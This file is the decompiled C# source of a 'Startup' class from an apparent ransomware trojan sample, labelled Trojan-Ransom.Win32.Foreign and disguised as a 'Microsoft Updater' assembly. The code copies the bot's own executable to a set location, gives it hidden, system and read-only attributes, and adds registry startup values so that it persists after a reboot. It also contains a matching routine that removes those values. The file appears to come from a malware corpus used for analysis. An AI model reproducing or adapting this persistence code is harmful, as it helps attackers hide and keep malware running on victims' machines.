// Decompiled with JetBrains decompiler
// Type: Epidemic_HTTP.Startup
// Assembly: Microsoft Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2B3032-0636-4B8C-A49B-30EA659CCFCC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\Trojan-Ransom.Win32.Foreign.neod-4b5461e9b7975d274b77e2b28ee9fc7a71cf3294652993dfd23081524d2a783e.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;

namespace Epidemic_HTTP
{
  internal class Startup
  {
    public static bool Exit_Bot = false;

    public void RemoveStartup()
    {
      try
      {
        File.SetAttributes(Config.bot_file, FileAttributes.Normal);
      }
      catch
      {
      }
      foreach (string registryKey in Config.registry_keys)
      {
        try
        {
          Registry.CurrentUser.OpenSubKey(registryKey, true).DeleteValue(Config.registry_name);
        }
        catch
        {
        }
      }
      if (Startup.Exit_Bot)
        Environment.Exit(0);
      Startup.Exit_Bot = false;
    }

    public void AddStartup()
    {
      try
      {
        if (Directory.GetCurrentDirectory() + "\\" != Config.bot_file_path)
        {
          if (File.Exists(Config.bot_file))
          {
            File.SetAttributes(Config.bot_file, FileAttributes.Normal);
            File.Delete(Config.bot_file);
          }
          File.Copy(Assembly.GetExecutingAssembly().Location, Config.bot_file);
          File.SetAttributes(Config.bot_file, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
        }
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
      }
      foreach (string registryKey in Config.registry_keys)
      {
        try
        {
          Registry.CurrentUser.OpenSubKey(registryKey, true).SetValue(Config.registry_name, (object) Config.bot_file);
        }
        catch
        {
        }
      }
    }
  }
}
